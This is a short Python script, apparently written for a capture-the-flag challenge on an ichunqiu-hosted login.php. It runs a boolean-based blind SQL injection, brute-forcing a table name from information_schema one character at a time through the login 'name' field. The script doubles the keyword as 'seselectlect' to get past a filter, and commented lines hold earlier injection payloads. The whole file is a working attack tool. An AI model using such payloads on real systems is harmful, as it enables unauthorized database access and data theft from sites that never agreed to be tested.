# coding:utf-8

import requests
import string

dic = string.digits + string.ascii_letters + "!@#$%^&*()_+{}-="
length = 4
name = ''
right = '8bef'
worry = '5728'
url = 'http://eci-2ze8v5kgperd619475pv.cloudeci1.ichunqiu.com/login.php'
for j in range(1, length + 1):
    for i in range(48, 123):
        # key = "admin%1$' and " + "(substr(database(),0,1)=" + i + ")#"
        # key = "admin%1$' and " + "(substr(database(),"+str(j)+",1)=" + i + ")#"
        key = "admin'" + " and (ascii(substr((seselectlect  table_name FROM information_schema.tables WHERE table_schema=0x6e6f7465 limit 0,1),%d,1))=%d)#" % (
        j, i)
        data = {'name': key, 'pass': '111'}
        r = requests.post(url, data=data).text
        if right in str(r):
            name += chr(i)
            print(name)

